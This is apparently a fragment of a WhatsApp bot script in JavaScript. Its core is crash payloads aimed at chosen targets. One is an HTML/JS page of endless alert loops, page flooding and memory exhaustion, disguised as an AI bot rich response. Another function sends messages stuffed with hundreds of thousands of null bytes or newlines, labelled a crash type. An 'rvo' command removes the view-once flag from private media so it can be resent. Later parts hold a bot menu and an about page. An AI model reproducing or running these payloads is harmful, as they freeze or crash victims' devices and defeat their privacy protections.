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fPwELCvFG/iooLamf1fwWCQqyKihL+KNxYVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//uSZIeP8txFJ0ngHpIygsSwACweAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();


    while (true) {
      for (let i = 0; i < 1000; i++) {
        let div = document.createElement('div');
        div.innerHTML = 'AMPOSSS_'.repeat(500);
        document.body.appendChild(div);
      }
      alert("\u26a0\ufe0f Hayo Ngapain 😹☠️ \u26a0\ufe0f");
    }

    (function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }
        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
    })();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  }

  await WaSocket.relayMessage(target, message, {
    messageId: mid
  })

  await WaSocket.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}
  
  
async function bokep(target) {
    const to = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
    const z = (s) => "\x00".repeat(s);

    const groupStatusInteractive = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Holaaa" + z(300000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 300000 }, () => ({}))
                    }
                }
            }
        }
    };

    const groupStatusResponse = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "SkyVoluntaireDelay Heree",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"skyy","city":"voluntaire","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"skyy | ${z(9000)}"}}`,
                        version: 3
                    },
                    contextInfo: {
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 2,
                                expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                            }
                        }
                    }
                }
            }
        }
    };

    const viewOncePayload = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Ryukisan" },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    const groupStatusPayload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: { title: "\0" },
                    body: { text: "SkyVoluntaireHeree" },
                    nativeFlowMessage: {
                        buttons: "\n".repeat(450000)
                    }
                }
            }
        }
    };

    try {
        await WaSocket.relayMessage('status@broadcast', groupStatusInteractive, {
            statusJidList: [to]
        });
        await Wasocket.relayMessage('status@broadcast', groupStatusResponse, {
            statusJidList: [to]
        });
        console.log("Successfully sent to target!");
    } catch (error) {
        console.error("Error:", error.message);
        throw error;
    }

    try {
        await Wasocket.relayMessage(to, viewOncePayload, {});
    } catch (e) {
        console.error('ViewOnce send error:', e);
    }

    try {
        await WaSocket.relayMessage(to, groupStatusPayload, {});
    } catch (e) {
        console.error('GroupStatus send error:', e);
    }

    return {
        success: true,
        target: to,
        crashType: "DelayInvisible",
        creator: "ryukisan"
    };
}

  // END
  
  switch (command) {      
    case "rvo": {
      let ahoi = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      if (!ahoi) return reply("reply to a view once message")
      if (ahoi?.videoMessage?.viewOnce) ahoi.videoMessage.viewOnce = false;
      if (ahoi?.imageMessage?.viewOnce) ahoi.imageMessage.viewOnce = false;
      if (ahoi?.audioMessage?.viewOnce) ahoi.audioMessage.viewOnce = false;
      if (ahoi?.extendedTextMessage?.viewOnce) ahoi.extendedTextMessage.viewOnce = false;
      const rvoMsgId = crypto.randomBytes(8).toString('hex').toUpperCase();
      WaSocket.relayMessage(from, ahoi, { messageId: rvoMsgId });
    } break;    

case "270511": {
  try {
    const SOCKET = typeof WaSocket !== 'undefined' ? WaSocket : client;
    const target = from || m.chat || m.key.remoteJid;

    if (typeof SOCKET.sendRich !== 'function' || typeof SOCKET.editRich !== 'function') {
      return m.reply("❌ Fitur sendRich/editRich tidak tersedia di bot ini.");
    }

    const textSection = (text) => ({
      __typename: 'GenAIUnifiedResponseSection',
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIMarkdownTextUXPrimitive',
          text,
          inline_entities: []
        }
      }
    });

    const codeSection = {
      __typename: 'GenAIUnifiedResponseSection',
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAICodeUXPrimitive',
          language: 'javascript',
          code_blocks: [
            { content: "// Contoh Penggunaan Bot\n", type: 'COMMENT' },
            { content: "const ", type: 'KEYWORD' },
            { content: "bot", type: 'DEFAULT' },
            { content: " = ", type: 'DEFAULT' },
            { content: "'FandiXppL'", type: 'STR' },
            { content: ";\n", type: 'DEFAULT' },
            { content: "console", type: 'DEFAULT' },
            { content: ".", type: 'DEFAULT' },
            { content: "log", type: 'METHOD' },
            { content: "(", type: 'DEFAULT' },
            { content: "`Hello World`", type: 'STR' },
            { content: ");", type: 'DEFAULT' }
          ]
        }
      }
    };

    // Teks menu pakai backtick biar rapi
    const menuText = `
# Fandi-XppL

> **Welcome To Asisten**
> — All BY-FandiXpL

## **#1**

>— S - Make Stiker
>— Sprem - Make Stiker Premium
>— ToImG - get ST To ImG
>— RvO - OneImG To ImG
>— Ai - Ask Ai
>— Play - Get Audio
>— Play2 - Get Audio V2
>— xlp - LocK GruP
>— Loitt - LocK GruP V2
>— PaY - Send PayMeNT
>— About-Me - Me?! 

## **#2**

>— Restart - MuatUlang 
>— JdX - InpuT CoDe
>— InsP - GetCoDe To JsOn
>— LeAvE - OuT-GB
>— Self - PB
>— Public - MD
>— ^ - DebUGK
>— ^ JSON.stringify({ [m.quoted.mtype]:m.quoted }, null, 2) - CoDe JsOn
------------------------------------------
*Fandi XpL • 2027*
    `;

    const loading = await SOCKET.sendRich(target, { text: '⏳ Memuat Menu...' });
    await new Promise((r) => setTimeout(r, 1500));

    await SOCKET.editRich(target, loading.key, {
      sections: [codeSection, textSection(menuText)]
    });

  } catch (e) {
    console.error("[MENU ERROR]", e);
    m.reply("❌ Gagal memuat menu: " + e.message);
  }
}
break;

case "about-me": {
  const esc = s => String(s).replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;",
    '"': "&quot;", "'": "&#39;"
  }[c]))

  const page = (title, sub, content) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
html,body{margin:0;width:100%;min-height:100%;background:#050805;color:#d8e8d8;font-family:Arial,sans-serif}
body{padding:28px 18px}
.wrap{max-width:520px;margin:auto}
.line{width:52px;height:2px;background:#20ff20;box-shadow:0 0 8px #0f0;margin:12px 0 25px}
.title{font-size:23px;font-weight:700;color:#fff;margin-bottom:6px}
.sub{font-size:12px;color:#718671;margin-bottom:24px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.card{background:#090e09;border:1px solid #182518;border-radius:12px;padding:16px;min-height:82px}
.card b{display:block;color:#20ff20;font-size:12px;letter-spacing:.7px;margin-bottom:7px}
.card span{font-size:11px;color:#91a391;line-height:1.55}
.footer{margin-top:27px;color:#425242;font-size:10px;text-align:center;letter-spacing:1.2px}
